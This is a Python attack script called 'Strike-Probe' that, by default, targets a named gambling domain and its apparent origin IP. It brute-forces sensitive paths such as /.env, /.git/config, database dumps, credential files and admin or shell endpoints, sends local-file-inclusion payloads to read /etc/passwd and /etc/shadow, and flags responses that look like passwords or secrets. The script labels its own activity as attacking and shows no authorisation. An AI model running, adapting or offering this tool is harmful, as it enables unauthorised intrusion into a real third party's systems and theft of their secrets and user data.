#!/usr/bin/env python3
import asyncio
import aiohttp
import json
import time
import argparse
from urllib.parse import quote

ORIGIN = "165.227.120.132"
DOMAIN = "runehall.com"

# Every potentially useful path, no filter
PATHS = [
    "/", "/admin", "/dashboard", "/panel", "/cpanel", "/webmail", "/plesk",
    "/.env", "/.env.production", "/.env.local", "/.git/config", "/config.php",
    "/wp-config.php", "/backup.sql", "/database.sql", "/dump.sql",
    "/credentials.txt", "/secrets.txt", "/passwords.txt", "/api", "/api/v1",
    "/api/v2", "/graphql", "/swagger.json", "/phpinfo.php", "/server-status",
    "/phpmyadmin", "/pma", "/mysql", "/myadmin", "/grafana", "/jenkins",
    "/portainer", "/docker", "/_debug", "/console", "/shell", "/cmd",
    "/actuator/env", "/actuator/health", "/metrics", "/prometheus", "/v1/internal/stats"
]

# LFI payloads
LFI = [
    "../../../../../../etc/passwd",
    "../../../../../../etc/shadow",
    "/etc/passwd",
    "/etc/hosts"
]

async def probe(session, url):
    try:
        async with session.get(url, timeout=5, ssl=False) as r:
            if r.status in (200, 302, 401, 403, 500):
                text = await r.text()
                size = len(text)
                return {"url": url, "status": r.status, "size": size, "title": text[:200]}
    except:
        return None

async def main():
    parser = argparse.ArgumentParser(description="Strike-Probe tool with rate limiting")
    parser.add_argument("--ip", type=str, default=ORIGIN, help=f"Target IP address (default: {ORIGIN})")
    parser.add_argument("--domain", type=str, default=DOMAIN, help=f"Target domain (default: {DOMAIN})")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay between requests in seconds (default: 0.5)")
    parser.add_argument("--lfi", nargs="+", default=LFI, help="List of LFI payloads to test")
    args = parser.parse_args()

    print(f"[*] Attacking origin: {args.ip}")
    print(f"[*] Target domain: {args.domain}")
    print(f"[*] Delay between requests set to: {args.delay} seconds")
    
    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=connector, headers={"Host": args.domain, "User-Agent": "Mozilla/5.0"}) as session:
        urls_to_visit = []
        for path in PATHS:
            urls_to_visit.append(f"http://{args.ip}{path}")
            urls_to_visit.append(f"https://{args.ip}{path}")
        for payload in args.lfi:
            urls_to_visit.append(f"http://{args.ip}/index.php?file={quote(payload)}")
            urls_to_visit.append(f"http://{args.ip}/page?path={quote(payload)}")
            
        tasks = []
        for url in urls_to_visit:
            tasks.append(probe(session, url))
            if args.delay > 0:
                await asyncio.sleep(args.delay) # Rate limit delay between issuing requests
        
        results = await asyncio.gather(*tasks)
        findings = [r for r in results if r]
        
        print(f"\n[+] Findings: {len(findings)}")
        for f in findings:
            print(f"  {f['status']} {f['url']} ({f['size']} bytes)")
            if "password" in f['title'].lower() or "secret" in f['title'].lower():
                print(f"      [!] POSSIBLE SECRET: {f['title'][:100]}")
        
        with open(f"strike_{int(time.time())}.json", "w") as out:
            json.dump(findings, out, indent=2)
        print("\n[+] Results saved.")

if __name__ == "__main__":
    asyncio.run(main())
